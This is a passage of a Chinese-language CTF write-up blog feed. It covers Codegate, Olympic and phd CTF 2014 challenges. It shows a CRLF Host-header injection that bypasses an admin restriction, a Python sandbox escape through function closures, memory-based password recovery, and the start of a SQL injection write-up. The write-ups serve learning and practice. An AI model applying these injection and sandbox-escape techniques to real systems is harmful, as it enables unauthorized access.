&lt;/pre&gt;&lt;/div&gt;


&lt;blockquote&gt;
&lt;p&gt;...&lt;br&gt;
Date: Tue, 25 Feb 2014 19:00:30 GMT&lt;br&gt;
Server: gws&lt;br&gt;
Content-Length: 261&lt;br&gt;
X-XSS-Protection: 1; mode=block  &lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;喔喔 看起來有反應&lt;br&gt;
還意外發現 google 的 &lt;strong&gt;XSS protect&lt;/strong&gt; XD&lt;br&gt;
這邊我們可以偽造 header 竄改來源了&lt;br&gt;
但是網站好像有做過濾&lt;br&gt;
只要包含 &lt;code&gt;58.229.183.24&lt;/code&gt; 都會被擋下來&lt;br&gt;
顯示 &lt;em&gt;Access Denied&lt;/em&gt;&lt;br&gt;
改嘗試從 &lt;strong&gt;localhost&lt;/strong&gt; 去連頁面:&lt;br&gt;
&lt;code&gt;url=localhost/188f6594f694a3ca082f7530b5efc58dedf81b8d/admin/&lt;/code&gt;  &lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;HTTP/1.1 200 OK&lt;br&gt;
Date: Tue, 25 Feb 2014 18:49:08 GMT&lt;br&gt;
Server: Apache/2.4.6 (Ubuntu)  &lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;如此就繞過 &lt;code&gt;.htaccess&lt;/code&gt; 的限制了 lol&lt;br&gt;
由於這個 proxy 只會顯示網頁的部分內容&lt;br&gt;
在 header 加入 &lt;code&gt;Range&lt;/code&gt; 可以控制顯示內容範圍  &lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="n"&gt;Host&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="mi"&gt;123&lt;/span&gt;&lt;span class="o"&gt;%&lt;/span&gt;&lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="n"&gt;d&lt;/span&gt;&lt;span class="o"&gt;%&lt;/span&gt;&lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="n"&gt;a&lt;/span&gt;  
&lt;span class="n"&gt;Range&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="n"&gt;bytes&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="mi"&gt;100&lt;/span&gt;&lt;span class="o"&gt;%&lt;/span&gt;&lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="n"&gt;d&lt;/span&gt;&lt;span class="o"&gt;%&lt;/span&gt;&lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="n"&gt;a&lt;/span&gt;  
&lt;span class="o"&gt;%&lt;/span&gt;&lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="n"&gt;d&lt;/span&gt;&lt;span class="o"&gt;%&lt;/span&gt;&lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="n"&gt;a&lt;/span&gt;  
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;慢慢dump內容，結果發現...  &lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;Access Denied&lt;br&gt;
\&lt;br&gt; 100  &lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;好吧 看來 code 可能也是有做些存取限制&lt;br&gt;
嘗試改成 &lt;code&gt;Host: localhost&lt;/code&gt;&lt;br&gt;
... fail again&lt;br&gt;
在這邊卡關了一陣子&lt;br&gt;
決定還是慢慢把全部內容 dump 出來&lt;br&gt;
結果發現這一段...  &lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;$_SERVER[HTTP_HOST]=="hackme")--&amp;gt;\&lt;/body&gt;&lt;br&gt;
&amp;lt;!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN"&amp;gt;  &lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;所以改成 &lt;code&gt;Host: hackme&lt;/code&gt;&lt;br&gt;
這題就過了  &lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;hello admin\&lt;br&gt;&lt;br&gt;
Password is WH0_IS_SnUS_bI1G_F4N  &lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;flag: &lt;code&gt;WH0_IS_SnUS_bI1G_F4N&lt;/code&gt;  &lt;/p&gt;</content><category term="Codegate CTF"></category><category term="CRLF"></category></entry><entry><title>Codegate CTF Preliminary 2014 150 WeirdShark</title><link href="https://ddaa.tw/codegate_forensic_150_weirdshark.html" rel="alternate"></link><published>2014-02-25T00:20:00+08:00</published><updated>2014-02-25T00:20:00+08:00</updated><author><name>ddaa</name></author><id>tag:ddaa.tw,2014-02-25:/codegate_forensic_150_weirdshark.html</id><summary type="html">&lt;p&gt;這題是這次 CTF 唯一的一題 Forensics ......  &lt;/p&gt;
&lt;hr&gt;
&lt;p&gt;題目是一個 pcap 檔&lt;br&gt;
用 &lt;strong&gt;wireshark&lt;/strong&gt; 開啟卻出現錯誤訊息&lt;br&gt;
&lt;img alt="weirdshark1.PNG" src="https://ddaa.tw/images/codegate_2014_weirdshark_1.png"&gt;  &lt;/p&gt;
&lt;p&gt;看來是毀損了&lt;br&gt;
只好想辦法修復&lt;br&gt;
找到一個線上修復 pcap 的網站&lt;br&gt;
&lt;a href="http://f00l.de/pcapfix/"&gt;pcapfix&lt;/a&gt;  &lt;/p&gt;
&lt;p&gt;修復後再開一次檔案...fail again&lt;br&gt;
&lt;img alt="weirdshark2.PNG" src="https://ddaa.tw/images/codegate_2014_weirdshark_2.png"&gt;&lt;br&gt;
至少 &lt;em&gt;cap_len&lt;/em&gt; 變小了&lt;br&gt;
這次只好自己手動修復了 QQ&lt;br&gt;
&lt;code&gt;62 = 0x3E, 64 = 0x40&lt;/code&gt;&lt;br&gt;
搜尋一下 0x40&lt;br&gt;
嘗試改成 0x3E&lt;br&gt;
&lt;img alt="weirdshark3.PNG" src="https://ddaa.tw/images/codegate_2014_weirdshark_3.png"&gt;&lt;br&gt;
然後就 work 了... =.=  &lt;/p&gt;
&lt;p&gt;除了一般 tcp 就只出現 http了&lt;br&gt;
看到有 &lt;em&gt;GET /xxx.jpg&lt;/em&gt; 的可疑封包&lt;br&gt;
把檔案解開來看看&lt;br&gt;
&lt;code&gt;file -&amp;gt; extract object -&amp;gt; http&lt;/code&gt;&lt;br&gt;
將所有檔案檢查過以後 …&lt;/p&gt;</summary><content type="html">&lt;p&gt;這題是這次 CTF 唯一的一題 Forensics ......  &lt;/p&gt;
&lt;hr&gt;
&lt;p&gt;題目是一個 pcap 檔&lt;br&gt;
用 &lt;strong&gt;wireshark&lt;/strong&gt; 開啟卻出現錯誤訊息&lt;br&gt;
&lt;img alt="weirdshark1.PNG" src="https://ddaa.tw/images/codegate_2014_weirdshark_1.png"&gt;  &lt;/p&gt;
&lt;p&gt;看來是毀損了&lt;br&gt;
只好想辦法修復&lt;br&gt;
找到一個線上修復 pcap 的網站&lt;br&gt;
&lt;a href="http://f00l.de/pcapfix/"&gt;pcapfix&lt;/a&gt;  &lt;/p&gt;
&lt;p&gt;修復後再開一次檔案...fail again&lt;br&gt;
&lt;img alt="weirdshark2.PNG" src="https://ddaa.tw/images/codegate_2014_weirdshark_2.png"&gt;&lt;br&gt;
至少 &lt;em&gt;cap_len&lt;/em&gt; 變小了&lt;br&gt;
這次只好自己手動修復了 QQ&lt;br&gt;
&lt;code&gt;62 = 0x3E, 64 = 0x40&lt;/code&gt;&lt;br&gt;
搜尋一下 0x40&lt;br&gt;
嘗試改成 0x3E&lt;br&gt;
&lt;img alt="weirdshark3.PNG" src="https://ddaa.tw/images/codegate_2014_weirdshark_3.png"&gt;&lt;br&gt;
然後就 work 了... =.=  &lt;/p&gt;
&lt;p&gt;除了一般 tcp 就只出現 http了&lt;br&gt;
看到有 &lt;em&gt;GET /xxx.jpg&lt;/em&gt; 的可疑封包&lt;br&gt;
把檔案解開來看看&lt;br&gt;
&lt;code&gt;file -&amp;gt; extract object -&amp;gt; http&lt;/code&gt;&lt;br&gt;
將所有檔案檢查過以後&lt;br&gt;
發現在 pdf 檔裡面有 flag XD&lt;br&gt;
&lt;img alt="flag.PNG" src="https://ddaa.tw/images/codegate_2014_weirdshark_flag.png"&gt;  &lt;/p&gt;
&lt;p&gt;flag: &lt;code&gt;FORENSICS_WITH_HAXORS&lt;/code&gt;  &lt;/p&gt;</content><category term="Codegate CTF"></category><category term="Wireshark"></category></entry><entry><title>Codegate CTF Preliminary 2014 200 dodoCrackme</title><link href="https://ddaa.tw/codegate_reverse_200_dodocrackme.html" rel="alternate"></link><published>2014-02-24T01:53:00+08:00</published><updated>2014-02-24T01:53:00+08:00</updated><author><name>ddaa</name></author><id>tag:ddaa.tw,2014-02-24:/codegate_reverse_200_dodocrackme.html</id><summary type="html">&lt;p&gt;這是應該是我玩過的 CTF 裡面最硬的一次 ORZ&lt;br&gt;
大量的 pwn 和 reversing&lt;br&gt;
根本破壞遊戲體驗....= =&lt;br&gt;
這次跟 217 和 chroot 還有 sqlab 學長一起參加&lt;br&gt;
跟大大們學到很多招數 :)&lt;br&gt;
希望下次別這麼醬油了 Orz  &lt;/p&gt;
&lt;hr&gt;
&lt;p&gt;這題是 &lt;strong&gt;ELF 64-bit LSB executable&lt;/strong&gt;&lt;br&gt;
先觀察一下行為:  &lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;root@localhost's password: 1234&lt;br&gt;
Permission denied (password).  &lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;感覺就要先把 root password 弄到手&lt;br&gt;
先把分析看看 binary&lt;br&gt;
用ida打開會嚇一跳&lt;br&gt;
因為是用組語寫的 Orz&lt;br&gt;
function 只有一個start&lt;br&gt;
出現很多 syscall  &lt;/p&gt;
&lt;p&gt;查一下資料發現 syscall 會把 call number …&lt;/p&gt;</summary><content type="html">&lt;p&gt;這是應該是我玩過的 CTF 裡面最硬的一次 ORZ&lt;br&gt;
大量的 pwn 和 reversing&lt;br&gt;
根本破壞遊戲體驗....= =&lt;br&gt;
這次跟 217 和 chroot 還有 sqlab 學長一起參加&lt;br&gt;
跟大大們學到很多招數 :)&lt;br&gt;
希望下次別這麼醬油了 Orz  &lt;/p&gt;
&lt;hr&gt;
&lt;p&gt;這題是 &lt;strong&gt;ELF 64-bit LSB executable&lt;/strong&gt;&lt;br&gt;
先觀察一下行為:  &lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;root@localhost's password: 1234&lt;br&gt;
Permission denied (password).  &lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;感覺就要先把 root password 弄到手&lt;br&gt;
先把分析看看 binary&lt;br&gt;
用ida打開會嚇一跳&lt;br&gt;
因為是用組語寫的 Orz&lt;br&gt;
function 只有一個start&lt;br&gt;
出現很多 syscall  &lt;/p&gt;
&lt;p&gt;查一下資料發現 syscall 會把 call number 放在 &lt;code&gt;rax&lt;/code&gt; &lt;br&gt;
用 interrupt 處理動作  &lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt; mov    $0x1,%eax  
 mov    $0x1,%edi  
 mov    %rbp,%rsi  
 mov    $0x1,%edx  
 syscall  
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;上面組語的行為是 &lt;code&gt;write(1, rbp, 1);&lt;/code&gt;&lt;br&gt;
過程中是用 inc / dec 控制輸出的 byte&lt;br&gt;
直接看 code 看不出密碼&lt;br&gt;
輸出 &lt;em&gt;root@localhost's password:&lt;/em&gt; 後&lt;br&gt;
接著是一些用途不明的 code&lt;br&gt;
然後才是 syscall read&lt;br&gt;
在 syscall 的地方下 breakpoint&lt;br&gt;
接著把 &lt;code&gt;rbp&lt;/code&gt; 附近的 memory dump 出來&lt;br&gt;
發現從 &lt;code&gt;0x7ffff7ff8b58&lt;/code&gt; 開始&lt;br&gt;
每隔 16 byte 就會有奇怪的字元:  &lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;0x7ffff7ff8b58: 72 'H'  &lt;br&gt;
0x7ffff7ff8b60: 0 '\000'&lt;br&gt;
0x7ffff7ff8b68: 52 '4'  &lt;br&gt;
0x7ffff7ff8b70: 0 '\000'&lt;br&gt;
0x7ffff7ff8b78: 80 'P'  &lt;br&gt;
0x7ffff7ff8b80: 0 '\000'&lt;br&gt;
0x7ffff7ff8b88: 80 'P'  &lt;br&gt;
0x7ffff7ff8b90: 0 '\000'&lt;br&gt;
0x7ffff7ff8b98: 89 'Y'  &lt;br&gt;
...  &lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;所以推測剛剛那段意義不明的 code 是用來生成 password&lt;br&gt;
不過到這已經可以知道 flag 了&lt;br&gt;
我就沒有去回去研究到底是不是如我猜想的了  &lt;/p&gt;
&lt;p&gt;flag: &lt;code&gt;H4PPY_C0DEGaTE_2014_CU_1N_K0RE4&lt;/code&gt;  &lt;/p&gt;</content><category term="Codegate CTF"></category></entry><entry><title>Olympic CTF 2014 10 point summary</title><link href="https://ddaa.tw/olympic_other_10_summary.html" rel="alternate"></link><published>2014-02-10T21:22:00+08:00</published><updated>2014-02-10T21:22:00+08:00</updated><author><name>ddaa</name></author><id>tag:ddaa.tw,2014-02-10:/olympic_other_10_summary.html</id><summary type="html">&lt;p&gt;這次的戰績只有慘不忍睹....&lt;br&gt;
除了 web200 以外&lt;br&gt;
其他解出的題目都只有 10 分 Orz&lt;br&gt;
Web200 Orange 大大的 &lt;a href="http://blog.orange.tw/2014/02/olympic-ctf-2014-curling-200-write-up.html"&gt;write up&lt;/a&gt; 已經很詳細了&lt;br&gt;
就不想再寫一份了 XD  &lt;/p&gt;
&lt;hr&gt;
&lt;h1&gt;Freestyle 10&lt;/h1&gt;
&lt;h2&gt;Trivial&lt;/h2&gt;
&lt;blockquote&gt;
&lt;p&gt;Hack the Planet_&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;這題 hitcon 也有出過 XD&lt;br&gt;
google 一下就知道是驚嘆號了&lt;br&gt;
btw, 這題原出處好像是 defcon  &lt;/p&gt;
&lt;h1&gt;CURLing 10&lt;/h1&gt;
&lt;h2&gt;Out there&lt;/h2&gt;
&lt;blockquote&gt;
&lt;p&gt;Flag is out there:&lt;br&gt;
http://[2a02:6b8:0:141f:fea9:d5ff:fed5:XX01]/&lt;br&gt;
Flag format …&lt;/p&gt;&lt;/blockquote&gt;</summary><content type="html">&lt;p&gt;這次的戰績只有慘不忍睹....&lt;br&gt;
除了 web200 以外&lt;br&gt;
其他解出的題目都只有 10 分 Orz&lt;br&gt;
Web200 Orange 大大的 &lt;a href="http://blog.orange.tw/2014/02/olympic-ctf-2014-curling-200-write-up.html"&gt;write up&lt;/a&gt; 已經很詳細了&lt;br&gt;
就不想再寫一份了 XD  &lt;/p&gt;
&lt;hr&gt;
&lt;h1&gt;Freestyle 10&lt;/h1&gt;
&lt;h2&gt;Trivial&lt;/h2&gt;
&lt;blockquote&gt;
&lt;p&gt;Hack the Planet_&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;這題 hitcon 也有出過 XD&lt;br&gt;
google 一下就知道是驚嘆號了&lt;br&gt;
btw, 這題原出處好像是 defcon  &lt;/p&gt;
&lt;h1&gt;CURLing 10&lt;/h1&gt;
&lt;h2&gt;Out there&lt;/h2&gt;
&lt;blockquote&gt;
&lt;p&gt;Flag is out there:&lt;br&gt;
http://[2a02:6b8:0:141f:fea9:d5ff:fed5:XX01]/&lt;br&gt;
Flag format: CTF{..32 hexes..}  &lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;這題難點是ipv6...&lt;br&gt;
由於我的機器沒辦法設定ipv6 route&lt;br&gt;
所以一開始沒辦法解 XD&lt;br&gt;
後來是到學校以後才發現學校有辦法瀏覽ipv6的web&lt;br&gt;
寫個批次檔一次開啟一堆網頁 (chrome 超強!)&lt;br&gt;
結果只有這個有畫面：&lt;br&gt;
&lt;code&gt;http://[2a02:6b8:0:141f:fea9:d5ff:fed5:6901]/&lt;/code&gt;&lt;br&gt;
看 source code 就找到flag了  &lt;/p&gt;
&lt;h1&gt;Binathlon 10&lt;/h1&gt;
&lt;h2&gt;Just No One&lt;/h2&gt;
&lt;blockquote&gt;
&lt;p&gt;Here's your binary: setup.exe&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;這題是最白爛的一題 XD&lt;br&gt;
附檔是一個利用 inno setup 包裝起來的一個安裝套件&lt;br&gt;
有密碼!&lt;br&gt;
用 ollydbg bypass 密碼以後可以正確安裝&lt;br&gt;
點擊程式...只會看到無限迴圈一直印&lt;br&gt;
&lt;code&gt;You already saw the flag&lt;/code&gt;&lt;br&gt;
一開始以為 flag 是安裝密碼&lt;br&gt;
但是 survey 以後發現 inno 比對的是 hash 過後的密碼&lt;br&gt;
所以 flag 應該不會在這&lt;br&gt;
隔天突然想通印出來的 msg 是提示&lt;br&gt;
然後把安裝前的 EULA 看一遍&lt;br&gt;
發現 flag 果然藏在那邊 XDD&lt;br&gt;
人生第一次認真看完 EULA....  &lt;/p&gt;
&lt;h1&gt;Figure Crypting 10&lt;/h1&gt;
&lt;h2&gt;Crypting&lt;/h2&gt;
&lt;blockquote&gt;
&lt;p&gt;43wdxz 4edcvgt5 65rdcvb 6tfcgh8uhb 9ijn&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;一開始以為是加密後的文字&lt;br&gt;
所以嘗試過 shift、substitution&lt;br&gt;
都解不出來.....&lt;br&gt;
後來自己打一遍發現這個string在鍵盤上的排列好像不太對勁...&lt;br&gt;
所以這五段代表的是五個英文字母...&lt;br&gt;
&lt;code&gt;sochi&lt;/code&gt;  &lt;/p&gt;
&lt;h1&gt;Nopsleigh 10&lt;/h1&gt;
&lt;h2&gt;As seen on DEFCON&lt;/h2&gt;
&lt;blockquote&gt;
&lt;p&gt;EBFE is to x86 as ____ is to ARM64  &lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;這題我沒解出來 :(&lt;br&gt;
survey以後發現 &lt;code&gt;EBFE&lt;/code&gt; 對於x86來說&lt;br&gt;
代表的是 &lt;code&gt;jmp 0x00&lt;/code&gt;&lt;br&gt;
所以就會變成無窮迴圈&lt;br&gt;
對於 arm64 來說 指令就是&lt;br&gt;
&lt;code&gt;b 0&lt;/code&gt; = &lt;code&gt;1400000&lt;/code&gt;&lt;br&gt;
我到這邊為止就卡住了&lt;br&gt;
後來才知道 arm64 要 little-endian&lt;br&gt;
所以是 &lt;code&gt;00000014&lt;/code&gt;.....&lt;/p&gt;
&lt;hr&gt;
&lt;p&gt;這次打完覺得自己還是太弱了 = =
比較需要技術性的都解到一半就解不下去
看來還需要多多加油 Orz&lt;/p&gt;</content><category term="Other CTF"></category></entry><entry><title>phd CTF 2014 Pwn 3900 pyjail</title><link href="https://ddaa.tw/phd_pwn_3900_pyjail.html" rel="alternate"></link><published>2014-01-28T21:31:00+08:00</published><updated>2014-01-28T21:31:00+08:00</updated><author><name>ddaa</name></author><id>tag:ddaa.tw,2014-01-28:/phd_pwn_3900_pyjail.html</id><summary type="html">&lt;p&gt;這題解超久 = = 好險有解出來&lt;br&gt;
但是知道關鍵又覺得這題好像沒什麼 Orz&lt;br&gt;
就好像變魔術一樣&lt;br&gt;
謎底揭曉就不好玩了 QQ  &lt;/p&gt;
&lt;hr&gt;
&lt;p&gt;這題給了 py 的 source code&lt;br&gt;
我們可以輸入一些指令&lt;br&gt;
pyjail 會利用 &lt;code&gt;exec&lt;/code&gt; 去執行&lt;br&gt;
但是有做一些限制:  &lt;/p&gt;
&lt;p&gt;1) 以下關鍵字都被過濾了...  &lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;sanitize = re.compile(  
  r&amp;#39;(?:__|import|globals|locals|exec|eval|join|format|replace|translate|try|except|with|content|frame|back)&amp;#39;  
  ).sub  
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;2) 僅接受以下字元  &lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;alphabet = &amp;#39; \n\r0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ(),.:;&amp;lt;=&amp;gt;[]_{}&amp;#39;  
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;3) 只留下 trusted …&lt;/p&gt;</summary><content type="html">&lt;p&gt;這題解超久 = = 好險有解出來&lt;br&gt;
但是知道關鍵又覺得這題好像沒什麼 Orz&lt;br&gt;
就好像變魔術一樣&lt;br&gt;
謎底揭曉就不好玩了 QQ  &lt;/p&gt;
&lt;hr&gt;
&lt;p&gt;這題給了 py 的 source code&lt;br&gt;
我們可以輸入一些指令&lt;br&gt;
pyjail 會利用 &lt;code&gt;exec&lt;/code&gt; 去執行&lt;br&gt;
但是有做一些限制:  &lt;/p&gt;
&lt;p&gt;1) 以下關鍵字都被過濾了...  &lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;sanitize = re.compile(  
  r&amp;#39;(?:__|import|globals|locals|exec|eval|join|format|replace|translate|try|except|with|content|frame|back)&amp;#39;  
  ).sub  
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;2) 僅接受以下字元  &lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;alphabet = &amp;#39; \n\r0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ(),.:;&amp;lt;=&amp;gt;[]_{}&amp;#39;  
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;3) 只留下 trusted built-in function  &lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;trusted_builtins = &amp;quot;&amp;quot;&amp;quot;  
  True False type int  
  &amp;quot;&amp;quot;&amp;quot;.split()  
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;這題的目的很明確，直接看 code :   &lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;def exec_in_context(ctx):  
  exec code in ctx  
  print &amp;#39;Flag is&amp;#39;,  
  try:  
    assert FLAG != part1_of_flag  
  except:  
    print &amp;#39;********************&amp;#39;  
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;&lt;code&gt;exec code in ctx&lt;/code&gt; 執行我們輸入的程式碼&lt;br&gt;
接著只要 &lt;code&gt;FLAG != part1_of_flag&lt;/code&gt; == True&lt;br&gt;
就會把 FLAG 印出來&lt;br&gt;
不然就會印出一堆星星&lt;br&gt;
至於 FLAG 的值&lt;br&gt;
是由以下兩個 function 去決定:  &lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;def we_must_be_sure_flag_part1_is_ready():  
    global FLAG  
    FLAG = part1_of_flag  

def we_must_be_sure_flag_part2_is_ready():  
    global FLAG  
    FLAG += part2_of_flag  
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;由於 &lt;code&gt;exec code in ctx&lt;/code&gt;&lt;br&gt;
closure 被限制了&lt;br&gt;
我們只能執行 &lt;code&gt;ctx = {'div': divider}&lt;/code&gt; 中所定義的的 function :  &lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;def divider(v1):  
    a = &amp;quot;You are lucky!&amp;quot;  
    b = &amp;quot;Try again!&amp;quot;  

    def divider(v2):  
        i,t,s,  n,o,t,  s,o,  h,a,r,d  
        if int(v1) / int(v2) == EXPECTED:  
            print a  
            we_must_be_sure_flag_part2_is_ready()  
        else:  
            print b  
    we_must_be_sure_flag_part1_is_ready()  
    return divider  
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;part1 的部分很簡單&lt;br&gt;
我們直接呼叫 div(1) 就會執行到了&lt;br&gt;
但是 part2 的部分&lt;br&gt;
&lt;code&gt;EXPECTED = 13.37&lt;/code&gt;&lt;br&gt;
兩個int相除不可能會是float Orz&lt;br&gt;
因此需要想辦法繞過那條限制  &lt;/p&gt;
&lt;p&gt;最直覺想法是改 &lt;code&gt;EXPECT&lt;/code&gt; 的值&lt;br&gt;
但是測試後發現 &lt;code&gt;EXPECT&lt;/code&gt; 不是 free variable&lt;br&gt;
怎麼改都沒效 XD&lt;br&gt;
後來想透過 overload &lt;code&gt;int()&lt;/code&gt;&lt;br&gt;
傳入自訂的 class&lt;br&gt;
令即使是用 &lt;code&gt;int()&lt;/code&gt; 結果依然是 &lt;em&gt;float&lt;/em&gt;&lt;br&gt;
可惜也失敗了&lt;br&gt;
因為 &lt;em&gt;__&lt;/em&gt; 被過濾 而且 &lt;em&gt;&lt;strong&gt;name&lt;/strong&gt;&lt;/em&gt; 也被拿掉了 = =  &lt;/p&gt;
&lt;p&gt;後來仔細想&lt;br&gt;
會留下 &lt;code&gt;type()&lt;/code&gt; 一定有他的原因&lt;br&gt;
以此作為突破點&lt;br&gt;
發現可以用 function 中有一個 attribute &lt;code&gt;func_code&lt;/code&gt;&lt;br&gt;
這個參數是 python 的 byte code&lt;br&gt;
可以替換這個屬性來執行其他的 function&lt;br&gt;
但是我在替換時&lt;br&gt;
遇上了 free variable 數目不符的訊息&lt;br&gt;
對 python 不夠熟 ... 不知道怎麼解決 QQ&lt;br&gt;
只好另尋他法&lt;br&gt;
就發現還有一個屬性 &lt;code&gt;func_closure&lt;/code&gt;&lt;br&gt;
裡面定義了函式中&lt;br&gt;
屬於其 closure 的變數或函式&lt;br&gt;
&lt;code&gt;print div(1).func_closure&lt;/code&gt;&lt;br&gt;
列出了一堆local variavle&lt;br&gt;
最後一項為:  &lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;cell at 0x801858520: function object at 0x80185cd70&gt;  &lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;這個物件其實就是 &lt;code&gt;we_must_be_sure_flag_part2_is_ready()&lt;/code&gt;&lt;br&gt;
理論上可以用 &lt;code&gt;cell_contents&lt;/code&gt; 將 cell 中的 object 拿出來&lt;br&gt;
但是 &lt;strong&gt;content&lt;/strong&gt; 被過濾 ...&lt;br&gt;
這時可以利用 type 新增物件的方式&lt;br&gt;
來得到 cell 的值  &lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;def get_cell_value(cell):  
    return type(lambda: 0)(  
        (lambda x: lambda: x)(0).func_code, {}, None, None, (cell,)  
    )()  
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;原理是:  &lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;&lt;code&gt;type(function)(func_code, func_global, func_name, func_default, func_closure)&lt;/code&gt;&lt;br&gt;
用這樣的方式定出一個 &lt;em&gt;print cell&lt;/em&gt; 的 function  &lt;/li&gt;
&lt;li&gt;&lt;code&gt;(lambda x: lambda: x)(0)&lt;/code&gt;&lt;br&gt;
定義這個 function 會把第一個參數的值回傳  &lt;/li&gt;
&lt;li&gt;最後把 cell 包裝成 closure 的形式&lt;br&gt;
原本的 closure 被換成我們傳入的 cell&lt;br&gt;
所以參數就變成 cell 中的 value  &lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;如此一來就可以執行 &lt;code&gt;we_must_be_sure_flag_part2_is_ready()&lt;/code&gt; 了&lt;br&gt;
btw, 前面想的利用替換 &lt;em&gt;func_code&lt;/em&gt; 也是可行的&lt;br&gt;
這題還有彩蛋，是要想辦法 read 檔案&lt;br&gt;
我沒有解出來 QQ&lt;br&gt;
後來才知道利用替換 func_code 的方式&lt;br&gt;
只要新增一行 &lt;code&gt;print type(stdout)(egg).read()&lt;/code&gt;&lt;br&gt;
就可以讀檔案了  &lt;/p&gt;
&lt;p&gt;flag: &lt;code&gt;7hE_0w15_4R3_n07_wh47_7h3Y_533m--7hEr3_15_4_m4n_1n_a_5m111n9_649&lt;/code&gt;  &lt;/p&gt;</content><category term="Other CTF"></category><category term="Jailbreak"></category></entry><entry><title>phd CTF 2014 Web 2700 PHDays</title><link href="https://ddaa.tw/phd_web_2700_phdays.html" rel="alternate"></link><published>2014-01-28T20:05:00+08:00</published><updated>2014-01-28T20:05:00+08:00</updated><author><name>ddaa</name></author><id>tag:ddaa.tw,2014-01-28:/phd_web_2700_phdays.html</id><summary type="html">&lt;p&gt;其實題目全名是&lt;br&gt;
&lt;em&gt;stand back, we have PHDays!&lt;/em&gt;&lt;br&gt;
我去翻以前上課的投影片才發現關鍵&lt;br&gt;
好險以前有好好上課 XDD  &lt;/p&gt;
&lt;hr&gt;
&lt;p&gt;連到網頁經過檢查以後&lt;br&gt;
會發現存在 &lt;code&gt;index.php~&lt;/code&gt; 這種暫存檔&lt;br&gt;
裡面有著登入的 source code  &lt;/p&gt;
&lt;p&gt;裡面有一行：&lt;br&gt;
&lt;code&gt;$query = "SELECT username FROM users WHERE id='$uid'";&lt;/code&gt;&lt;br&gt;
uid 並沒有做過濾，我們可以做 &lt;strong&gt;SQL injection&lt;/strong&gt;&lt;br&gt;
但是...  &lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;if(isset($_COOKIE[&amp;#39;uid&amp;#39;])) {
  $uid = openssl_decrypt ($_COOKIE[&amp;#39;uid&amp;#39;], $method, $key, false, $iv);
}
else {
  $uid = generateRandomString(32);
  setcookie(&amp;quot;uid …&lt;/pre&gt;&lt;/div&gt;</summary><content type="html">&lt;p&gt;其實題目全名是&lt;br&gt;
&lt;em&gt;stand back, we have PHDays!&lt;/em&gt;&lt;br&gt;
我去翻以前上課的投影片才發現關鍵&lt;br&gt;
好險以前有好好上課 XDD  &lt;/p&gt;
